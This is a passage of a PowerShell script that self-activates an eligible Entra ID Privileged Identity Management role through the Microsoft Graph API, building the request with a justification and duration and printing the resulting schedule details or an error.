        Write-Warn "Multiple eligible assignments found for '$RoleName'. Use -ScopeName to disambiguate. Using first match."
    }

    $eligible = $filtered[0]

    # Build request body
    $body = @{
        action           = "selfActivate"
        principalId      = $eligible.PrincipalId
        roleDefinitionId = $eligible.RoleDefinitionId
        directoryScopeId = $eligible.DirectoryScopeId
        justification    = $Justification
        scheduleInfo     = @{
            startDateTime = (Get-Date).ToUniversalTime().ToString("o")
            expiration    = @{
                type     = "afterDuration"
                duration = $Duration
            }
        }
    } | ConvertTo-Json -Depth 10

    # Activate
    try {
        $result = Invoke-MgGraphRequest -Method POST `
            -Uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignmentScheduleRequests" `
            -Body $body -ContentType "application/json" -ErrorAction Stop

        Write-Ok "PIM role activated successfully."
        Write-Host ""
        [PSCustomObject]@{
            Status           = $result.status
            RoleDefinitionId = $result.roleDefinitionId
            DirectoryScopeId = $result.directoryScopeId
            TargetScheduleId = $result.targetScheduleId
            CreatedDateTime  = $result.createdDateTime
            CompletedDateTime = $result.completedDateTime
        } | Format-List

    } catch { Write-Err "Failed to activate PIM role: $($_.Exception.Message -split "`n" | Select-Object -First 1)"; exit 1 }
}
``` 
